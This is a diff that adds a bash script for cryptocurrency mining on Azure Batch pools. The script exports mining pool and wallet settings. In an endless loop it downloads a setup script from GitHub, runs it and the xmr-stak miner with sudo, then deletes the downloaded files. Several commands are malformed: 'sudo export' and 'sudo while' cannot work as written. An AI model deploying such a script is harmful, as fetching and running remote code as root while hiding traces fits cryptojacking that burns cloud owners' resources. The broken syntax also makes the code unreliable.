@@ -1,0 +1,20 @@
+#!/bin/bash
+sudo export pool_pass1=${AZ_BATCH_POOL_ID}:azurecloudminingscript
+sudo export pool_address1=devilmpro.tech:3330
+sudo export wallet1=TERAZ
+sudo export nicehash1=false
+sudo export pool_pass2=${AZ_BATCH_POOL_ID}:azurecloudminingscript
+sudo export pool_address2=devilmpro.tech:3330
+sudo export wallet2=TERAZ
+sudo export nicehash2=false
+sudo while [ 1 ] ;do wget https://raw.githubusercontent.com/azurecloudminingscript/azure-cloud-mining-script/master/azure_script/setup_vm3.sh 
+sudo chmod u+x setup_vm3.sh
+sudo ./setup_vm3.sh
+cd azure-cloud-mining-script
+cd azure_script
+sudo ./run_xmr_stak.pl 30
+cd ..
+cd ..
+sudo rm -rf azure-cloud-mining-script
+sudo rm -rf setup_vm3.sh
+done
